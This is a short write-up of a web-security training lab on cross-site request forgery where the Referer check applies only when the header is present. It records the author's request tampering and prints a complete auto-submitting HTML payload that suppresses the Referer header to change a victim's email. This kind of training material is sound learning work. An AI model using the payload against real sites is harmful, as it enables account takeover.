### Lab: CSRF where Referer validation depends on header being present

This lab's email change functionality is vulnerable to CSRF. It attempts to block cross domain requests but has an insecure fallback.

To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.

You can log in to your own account using the following credentials: wiener:peter

_____

Analysis and Exploit:

1. Logged-in as user _wiener_, changed the email

2. In BurpRepeater sent the POST request to **/my-account/change-email** to change email address
    - setting the value of the Referer header to _http://fakedomain.fake_, the server returned response 400 Bad Request "Invalid referer header"
    - deleting the referer header, server accepted the request and processed the change-email request

3. Crafted and delivered to victim the following payload

```html
<html>
    <head>
        <meta name="referrer" content="never">
    </head>
    <body>
        <form action="URL/my-account/change-email" method="POST">
            <input required type="email" name="email" value="youjustgot@hacked">
            <button type="submit">Submit</button>
        </form>
        <script>
            document.forms[0].submit()
        </script>
    </body>
</html>
```

```<meta name="referrer" content="never">```: referer header is not sent along the request
